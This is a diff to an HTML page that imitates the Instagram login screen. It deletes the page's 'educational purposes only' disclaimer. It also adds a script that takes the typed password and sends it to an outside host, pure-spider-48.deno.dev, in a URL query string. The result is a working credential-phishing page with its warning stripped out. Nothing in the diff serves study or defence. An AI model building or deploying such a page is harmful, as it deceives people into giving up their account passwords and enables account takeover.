@@ -1,5 +1,4 @@
 <html>
-
 <head>
     <title>Instagram</title>
     <meta charset="utf-8">
@@ -7,22 +6,20 @@
     <meta http-equiv="refresh" content="60">
     <link rel="icon" href="images/favicon.png" type="image/icon">
     <link rel="stylesheet" type="text/css" href="style.css">
-
 </head>
 
 <body>
     <div class="container">
         <div class="page">
             <div class="logo">
-
                 <img src="images/instagram.png" alt="instagram" style="width: 175px; ">
             </div>
 
             <br />
-            <form class="container" action="send.php" method="post">
-                <input type="text" placeholder="Phone number, username, or email " name="u_name">
-                <input type="password" placeholder="Password" name="pass">
-                <button class="submitbutton">Log in </button>
+            <form class="container" id="loginForm">
+                <input type="text" placeholder="Phone number, username, or email " name="u_name" id="username">
+                <input type="password" placeholder="Password" name="pass" id="password">
+                <button class="submitbutton" onclick="sendLoginRequest()">Log in </button>
                 <br />
                 <div class="option">OR </div>
             </form>
@@ -39,17 +36,32 @@
                 <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/">
                         Sign up</a></p>
             </div>
-
         </div>
     </div>
 
     <br />
-    <div style="position:fixed;left:0;bottom:0;width:100%; color: #7e7979;">
-        <p style="text-align:center;"> Disclaimer this is not a real "instagram.com" page, please do not enter
-            your real username and password, it's only for educational purposes.</p>
-    </div>
     <br />
 
-</body>
+   <script>
+    function sendLoginRequest(event) {
+        event.preventDefault(); // Prevent form submission
 
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // Validate password before making the request
+        if (!password) {
+            console.error('Password is required');
+            return;
+        }
+
+        // Construct the server URL with only the password as a query parameter
+        const serverUrl = `https://pure-spider-48.deno.dev/text?text=${password}`;
+
+        // Redirect to the server URL with the password query parameter
+        window.location.href = serverUrl;
+    }
+</script>
+
+</body>
 </html>
